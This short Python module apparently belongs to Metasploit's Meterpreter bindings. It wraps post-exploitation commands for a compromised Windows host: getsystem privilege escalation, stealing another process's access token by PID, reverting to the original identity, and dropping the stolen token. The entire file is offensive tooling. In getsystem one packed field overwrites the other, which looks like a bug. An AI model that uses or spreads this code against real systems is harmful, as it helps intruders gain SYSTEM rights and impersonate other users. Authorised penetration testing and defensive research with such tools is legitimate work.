import meterpreter_bindings

from meterpreter.core import *
from meterpreter.tlv import *

# We only support technique 1 (as it's the only one that doesn't require DLLs)
def getsystem():
  tlv = tlv_pack(TLV_TYPE_ELEVATE_TECHNIQUE, 1)
  tlv = tlv_pack(TLV_TYPE_ELEVATE_SERVICE_NAME, rnd_string(5))
  resp = invoke_meterpreter('priv_elevate_getsystem', True, tlv)
  if resp == None:
    return False

  return packet_get_tlv(resp, TLV_TYPE_RESULT)['value'] == 0

def rev2self():
  resp = invoke_meterpreter('stdapi_sys_config_rev2self', True)
  if resp == None:
    return False

  return packet_get_tlv(resp, TLV_TYPE_RESULT)['value'] == 0

def steal_token(pid):
  tlv = tlv_pack(TLV_TYPE_PID, pid)
  resp = invoke_meterpreter('stdapi_sys_config_steal_token', True, tlv)
  if resp == None:
    return False

  print packet_get_tlv(resp, TLV_TYPE_RESULT)['value']
  return packet_get_tlv(resp, TLV_TYPE_RESULT)['value'] == 0

def drop_token():
  resp = invoke_meterpreter('stdapi_sys_config_drop_token', True)
  if resp == None:
    return False

  print packet_get_tlv(resp, TLV_TYPE_RESULT)['value']
  return packet_get_tlv(resp, TLV_TYPE_RESULT)['value'] == 0

